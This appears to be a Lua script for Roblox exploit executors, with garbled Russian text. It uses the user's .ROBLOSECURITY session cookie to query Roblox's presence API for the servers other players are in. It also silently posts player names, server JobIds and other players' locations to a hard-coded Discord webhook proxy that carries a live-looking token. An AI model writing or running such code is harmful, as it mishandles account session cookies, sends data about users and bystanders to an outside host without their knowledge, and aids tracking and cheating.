-- –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ–ª—å–∫–æ –¥–ª—è Delta –∏ KRNL
local allowedExecutors = {"Delta", "KRNL", "krnl"}

local function shouldCheckJobId()
    for _, allowed in ipairs(allowedExecutors) do
        if string.lower(executor) == string.lower(allowed) then
            return true
        end
    end
    return false
end

local function SendPartialLogToDiscord(stage, info)
    local Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441725786586615820/MjAaItKYv69qFFNdgxWQn1xe2HdO0ZV3rRKrbzBLk64Gb99KvxnLNyM9evUsYQa-Vd42"
    
    local embed = {
        ["title"] = "üîÑ –ü–æ–∏—Å–∫ JobId - " .. stage,
        ["color"] = 16753920,
        ["fields"] = {
            {
                ["name"] = "üìä –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è",
                ["value"] = "```" .. info .. "```",
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "JobId Verification System ‚Ä¢ " .. os.date("%H:%M:%S")
        }
    }
    
    local success, err = pcall(function()
        local response = request({
            Url = Webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["username"] = "JobId Finder",
                ["embeds"] = {embed}
            })
        })
    end)
    
    if not success then
        print("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞ –≤ Discord:", err)
    end
end

local function MakeRequestWithRetry(url, options, maxRetries)
    maxRetries = maxRetries or 3
    
    for attempt = 1, maxRetries do
        local success, response = pcall(function()
            return request(options)
        end)
        
        if success and response then
            if response.StatusCode == 503 then
                if attempt < maxRetries then
                    task.wait(2)
                end
            else
                return response
            end
        else
            if attempt < maxRetries then
                task.wait(1)
            end
        end
    end
    
    return nil
end

local realJobIdFound = false
local checkingJobId = false
local lastCheckTime = 0
local checkInterval = 10

local function GetRealJobIdWithAuth()
    if not getgenv().Cookie then
        return nil
    end
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then return nil end
    
    local placeId = game.PlaceId
    local userIds = {}
    local playerMap = {}
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            table.insert(userIds, player.UserId)
            playerMap[player.UserId] = player.Name
        end
    end
    
    if #userIds == 0 then
        return nil
    end
    
    local function GetPresenceWithAuth(userIdsList)
        local reqBody = HttpService:JSONEncode({
            userIds = userIdsList
        })
        
        local response = MakeRequestWithRetry("https://presence.roblox.com/v1/presence/users", {
            Url = "https://presence.roblox.com/v1/presence/users",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
            },
            Body = reqBody
        }, 3)
        
        if response then
            local jsonSuccess, jsonData = pcall(function()
                return HttpService:JSONDecode(response.Body)
            end)
            
            if jsonSuccess then
                return jsonData
            else
                return nil
            end
        else
            return nil
        end
    end
    
    local presenceData = GetPresenceWithAuth(userIds)
    if not presenceData then
        return nil
    end
    
    if not presenceData.userPresences then
        return nil
    end
    
    local foundJobIds = {}
    
    for _, presence in pairs(presenceData.userPresences) do
        if presence.placeId == placeId and presence.gameId then
            local jobId = presence.gameId
            local playerName = playerMap[presence.userId] or "Unknown"
            
            if jobId and jobId ~= game.JobId then
                table.insert(foundJobIds, {
                    jobId = jobId,
                    player = playerName,
                    lastLocation = presence.lastLocation or "InGame"
                })
            end
        end
    end
    
    if #foundJobIds > 0 then
        local jobIdCounts = {}
        for _, found in ipairs(foundJobIds) do
            jobIdCounts[found.jobId] = (jobIdCounts[found.jobId] or 0) + 1
        end
        
        local bestJobId, maxCount = nil, 0
        for jobId, count in pairs(jobIdCounts) do
            if count > maxCount then
                bestJobId = jobId
                maxCount = count
            end
        end
        
        if bestJobId then
            return bestJobId, foundJobIds
        end
    end
    
    return nil, {}
end

local function StartJobIdChecker()
    if checkingJobId then return end
    checkingJobId = true
    
    SendPartialLogToDiscord("–ù–∞—á–∞–ª–æ –ø–æ–∏—Å–∫–∞", 
        "–ò–≥—Ä–æ–∫: " .. Players.LocalPlayer.Name .. "\n" ..
        "–≠–∫–∑–µ–∫—É—Ç–æ—Ä: " .. executor .. "\n" ..
        "–ú–µ—Å—Ç–æ: " .. game.PlaceId .. "\n" ..
        "Local JobId: " .. game.JobId
    )
    
    while not realJobIdFound do
        local currentTime = tick()
        if currentTime - lastCheckTime >= checkInterval then
            lastCheckTime = currentTime
            
            print("–ü—Ä–æ–≤–µ—Ä–∫–∞ JobId...")
            local realJobId, foundJobs = GetRealJobIdWithAuth()
            
            if realJobId then
                realJobIdFound = true
                getgenv().RealJobId = realJobId
                
                local jobInfo = ""
                for _, job in ipairs(foundJobs) do
                    jobInfo = jobInfo .. string.format("–ò–≥—Ä–æ–∫: %s\nJobId: %s\n–°—Ç–∞—Ç—É—Å: %s\n\n", 
                        job.player, job.jobId, job.lastLocation)
                end
                
                SendPartialLogToDiscord("JobId –Ω–∞–π–¥–µ–Ω!", 
                    "‚úÖ –ù–∞–π–¥–µ–Ω Real JobId!\n\n" ..
                    "–ù–∞—à JobId: " .. game.JobId .. "\n" ..
                    "Real JobId: " .. realJobId .. "\n\n" ..
                    "–ù–∞–π–¥–µ–Ω–Ω—ã–µ JobId:\n" .. jobInfo
                )
                
                print("Real JobId –Ω–∞–π–¥–µ–Ω:", realJobId)
                checkingJobId = false
                return realJobId
            else
                local playerCount = #Players:GetPlayers()
                SendPartialLogToDiscord("–ü—Ä–æ–≤–µ—Ä–∫–∞...", 
                    "–ò–≥—Ä–æ–∫: " .. Players.LocalPlayer.Name .. "\n" ..
                    "–ò–≥—Ä–æ–∫–æ–≤ –≤ —Å–µ—Ä–≤–µ—Ä–µ: " .. playerCount .. "\n" ..
                    "–í—Ä–µ–º—è –ø—Ä–æ–≤–µ—Ä–∫–∏: " .. os.date("%H:%M:%S") .. "\n" ..
                    "–°—Ç–∞—Ç—É—Å: JobId –µ—â–µ –Ω–µ –Ω–∞–π–¥–µ–Ω"
                )
                print("JobId –µ—â–µ –Ω–µ –Ω–∞–π–¥–µ–Ω, –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º –ø–æ–∏—Å–∫...")
            end
        end
        task.wait(1)
    end
    checkingJobId = false
end

if getgenv().Cookie and shouldCheckJobId() then
    print("–ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ JobId –¥–ª—è —ç–∫–∑–µ–∫—É—Ç–æ—Ä–∞:", executor)
    
    coroutine.wrap(function()
        local realJobId = StartJobIdChecker()
        if not realJobId then
            getgenv().RealJobId = game.JobId
        end
    end)()
else
    print("–ü—Ä–æ–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É JobId –¥–ª—è —ç–∫–∑–µ–∫—É—Ç–æ—Ä–∞:", executor)
    getgenv().RealJobId = game.JobId
end

